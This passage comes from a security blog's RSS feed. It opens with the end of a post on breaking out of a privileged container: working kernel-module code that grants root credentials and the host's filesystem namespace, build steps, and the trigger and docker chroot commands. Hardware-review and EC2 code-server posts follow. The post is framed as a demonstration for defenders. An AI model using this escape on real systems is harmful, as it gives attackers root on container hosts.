&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;w_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;legitkit - fs overwrite - pid is %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;commit_creds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tweak_fs_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgroups&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgroups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_ops&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_fops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_write&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w_proc&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;init procfs module&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;proc_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;legit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_fops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_cleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remove_proc_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;legit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;MODULE_LICENSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GPL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;module_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;module_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_cleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;building-the-kernel-module&quot;&gt;Building the kernel module&lt;/h2&gt;

&lt;p&gt;Now we’ve got our kernel module code we need to build it on our target machine (or another one with the same kernel version) before we can load it. For Ubuntu you’ll need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;build-essential&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kmod&lt;/code&gt; to give you the tools and then the Linux headers for the host’s kernel version.&lt;/p&gt;

&lt;p&gt;Getting the Linux headers is easiest done when you’re running in a container on the target host, as you can just use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt update &amp;amp;&amp;amp; apt-get install -y linux-headers-$(uname -r)&lt;/code&gt; to get the right version.&lt;/p&gt;

&lt;p&gt;Also a Makefile is handy to help compile the module, something like&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += legit2.o

all:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;inserting-the-kernel-module-and-breaking-out&quot;&gt;Inserting the Kernel module and breaking out&lt;/h2&gt;

&lt;p&gt;Once you’ve got the kernel module built you insert it into the running kernel with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insmod legit2.ko&lt;/code&gt;, and then it’s triggered by echoing text to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/legit&lt;/code&gt; in the container&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/legit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve done that your shell gets access to the host’s mount namespace, which includes the Docker socket (or ContainerD/CRI-O socket depending on your runtime), and that means you’re one &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;pointless docker command&lt;/a&gt; from full root access on the host.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;-ti&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--privileged&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--volume&lt;/span&gt; /:/host busybox &lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; /host
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;putting-it-all-together&quot;&gt;Putting it all together&lt;/h2&gt;

&lt;p&gt;Here’s a video showing the process of building the kernel module, inserting it into the kernel and then breaking out of the container. The image I’m using is on Docker Hub as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raesene/privescape&lt;/code&gt;&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zoNY5malgHo&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This was just a quick blog demonstrating how an attacker with access to a privileged container can break out of it using a Kernel module and get access to the underlying host.&lt;/p&gt;
</description>
				<pubDate>Sun, 06 Aug 2023 10:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</guid>
			</item>
		
			<item>
				<title>Hardware review - Topton AMD Ryzen 7 5700U</title>
				<description>&lt;p&gt;I’ve been thinking about a project where I could travel to conferences with hardware to run a workshop that doesn’t rely on cloud resources (to avoid those concerns about network access or cloud uptime) and of course, the first part of any project like that is the fun part, buying the hardware! As I’d promised a review to a couple of people on-line, here it is.&lt;/p&gt;

&lt;p&gt;The goals for the hardware were to have something small and light with enough resources that it could support 10-20 students running on it, without breaking the bank. So, I decided to try getting a mini PC from AliExpress, as they have some pretty good deals on there.&lt;/p&gt;

&lt;p&gt;After a bit of looking around and asking friends who had bought systems like this from AliExpress before, I settled on a &lt;a href=&quot;https://www.aliexpress.com/item/1005005762253642.html&quot;&gt;Topton AMD Ryzen 7 5700U&lt;/a&gt;. The model I got cost £352.53.&lt;/p&gt;

&lt;p&gt;The purchase and shipping process was relatively smooth. After clarifying my address with the seller it took 8 days for the system to arrive. It was well packaged and arrived in good condition.&lt;/p&gt;

&lt;h2 id=&quot;specs&quot;&gt;Specs&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;CPU - AMD Ryzen 7 5700U with Radeon Graphics&lt;/li&gt;
  &lt;li&gt;RAM - 64GB DDR4 3200MHz, fitted as 2x32GB SODIMM&lt;/li&gt;
  &lt;li&gt;Storage - Fanxiang S500PRO 1TB&lt;/li&gt;
  &lt;li&gt;Network - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RTL8111/8168/8411 PCI Express Gigabit Ethernet Controller&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Wi-Fi - Wifi6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;physical-overview&quot;&gt;Physical overview&lt;/h2&gt;

&lt;p&gt;The system is pretty small, measuring 11.5cm x 10.5cm x 4cm, it comes with a power supply and an HDMI cable. The power supply output is a rated as 19V and 3.42A, so 65W. Physically it’s fairly small, 10.5cm x 4.5cm x 3cm. The case is metal and feels fairly solid&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/shoppy.png&quot; alt=&quot;Topton machine from the top&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The port selection is pretty good for such a small machine. On the back there’s power, 2xHDMI, Ethernet, 2xUSB-A, 1xUSB-C and a headphone jack, and on the front another 2xUSB-A.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/shoppy-ports.png&quot; alt=&quot;Topton machine back ports&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;noise&quot;&gt;Noise&lt;/h2&gt;

&lt;p&gt;Anecdotally I found the system to be relatively quiet. I’ve not got a good decibel meter, but took some measurements just using an iPhone app. when the host is idling at 5cm distance from the side, the reading was 30dB, which is around the standard background noise where I am. Periodically with nothing much running there’s a bit of fan noise, taking it up to ~41dB.&lt;/p&gt;

&lt;p&gt;Running a stress test with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stress-ng&lt;/code&gt; on 2 cores, to cause the fans to spin up, takes the volume at 5cm to ~51dB. So it’s not silent, but it’s not too loud either.&lt;/p&gt;

&lt;h2 id=&quot;software&quot;&gt;Software&lt;/h2&gt;

&lt;p&gt;The system came with an install of Windows 11 on it (not sure of the licensing situation for that install…), but for my purposes I wanted Linux, so I installed Debian 12 (Bookworm) on it. The installation process was fine, and the only thing I can see which isn’t supported (yet) is the Wi-Fi which is a Realtek device. A bit of searching suggests that’ll get a drive in the 6.2 kernel.&lt;/p&gt;

&lt;h2 id=&quot;performance&quot;&gt;Performance&lt;/h2&gt;

&lt;p&gt;Next question of course is, what’s the performance like? For this I used the &lt;a href=&quot;https://www.phoronix-test-suite.com/&quot;&gt;phoronix-test-suite&lt;/a&gt; to run a few benchmarks using their docker image &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run -it phoronix/pts&lt;/code&gt;, with results uploaded to &lt;a href=&quot;https://openbenchmarking.org/&quot;&gt;OpenBenchmarking.org&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://openbenchmarking.org/result/2307223-NE-APACHERES42&quot;&gt;Apache&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://openbenchmarking.org/result/2307228-NE-SHOPPYIOZ32&quot;&gt;iozone&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Overall the numbers seem pretty reasonable for a system of this class.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Overall this seems like a pretty good system for the price. Next step will be looking at how to build it as a workshop host for container security workshops.&lt;/p&gt;
</description>
				<pubDate>Sat, 22 Jul 2023 10:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2023/07/22/topton-ryzen-5700U-review/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/07/22/topton-ryzen-5700U-review/</guid>
			</item>
		
			<item>
				<title>Getting a VS Code Server running on EC2</title>
				<description>&lt;p&gt;As part of the preparations for the &lt;a href=&quot;https://www.steelcon.info/the-event/workshops/&quot;&gt;workshop on container security&lt;/a&gt;  that myself and &lt;a href=&quot;https://twitter.com/smarticu5/&quot;&gt;Iain Smart&lt;/a&gt; ran at this year’s &lt;a href=&quot;https://www.steelcon.info/&quot;&gt;Steelcon&lt;/a&gt;, there were some concerns that our standard option of SSH access might be blocked by the venue’s Wi-Fi, so a backup plan was in order. As a result, we were looking into how to provide a browser based terminal for students running on a host in AWS EC2.&lt;/p&gt;

&lt;p&gt;After looking at various options, we decided to see if we could get &lt;a href=&quot;https://github.com/coder/code-server&quot;&gt;code-server&lt;/a&gt; working. It’s a really nice project that provides a hosted version of VS Code, which gives you file exploring/editing, a terminal and port forwarding for local applications, all in a browser.&lt;/p&gt;

&lt;p&gt;After the conference, I decided to extract the config into a stand-alone set of Ansible tasks, and put it into my &lt;a href=&quot;https://github.com/raesene/container_sec_workstation&quot;&gt;Container Security Workstation&lt;/a&gt; repo. You can see the overall playbook &lt;a href=&quot;https://github.com/raesene/container_sec_workstation/blob/main/ec2_container_workstation.yml&quot;&gt;here&lt;/a&gt; but we’ll go through the key parts in this post.&lt;/p&gt;

&lt;p&gt;There were a couple of interesting technical aspects to getting it all working, which I thought I’d write-up here, in case it’s of use to other people!&lt;/p&gt;

&lt;h2 id=&quot;setting-up-an-ec2-instance-with-ansible&quot;&gt;Setting up an EC2 instance with Ansible&lt;/h2&gt;

&lt;p&gt;This is relatively straight-forward, but with one caveat, that Ansible changed the syntax of this, so if you have an older version of ansible this may not work. First up install the AWS ansible galaxy role &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible-galaxy collection install amazon.aws&lt;/code&gt; then have a block like this to setup the EC2 and wait for it to be available&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;start an instance with a public IP address&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;amazon.aws.ec2_instance&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Container&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Security&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Workstation&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;key_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;key_pair&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;vpc_subnet_id&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;subnet_id&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;instance_type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;instance_type&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;security_group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;security_group&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;network&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;assign_public_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image_id&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ami_id&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;wait_timeout&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;60&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;running&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ec2&lt;/span&gt;

&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Add all instance public IPs to host group&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;add_host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;hostname={{ item.public_ip_address }} groups=ec2host&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ec2.instances&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
  
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Wait for SSH to be available&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;delegate_to&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;item.public_ip_address&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;wait_for_connection&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;60&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;with_items&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ec2.instances&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A couple of key points to note for this. you’ll need a valid API connection to AWS with enough rights to create an EC2 instance. You’ll then need to have the information for the various variables here&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key_pair&lt;/code&gt; - The name of an SSH key pair in your AWS account to use for access to the host&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subnet_id&lt;/code&gt; - The ID of the subnet to place the EC2 in&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;region&lt;/code&gt; - The region to use&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instance_type&lt;/code&gt; - The EC2 instance type to use&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security_group&lt;/code&gt; - A security group that exists in your AWS account which allows at least 22/TCP, probably also 443/TCP for Caddy.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ami_id&lt;/code&gt; - the AMI ID to use for the host. In my case I use an ubuntu:22.04 based AMI.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;code-server-install-and-config&quot;&gt;Code Server Install and Config&lt;/h2&gt;

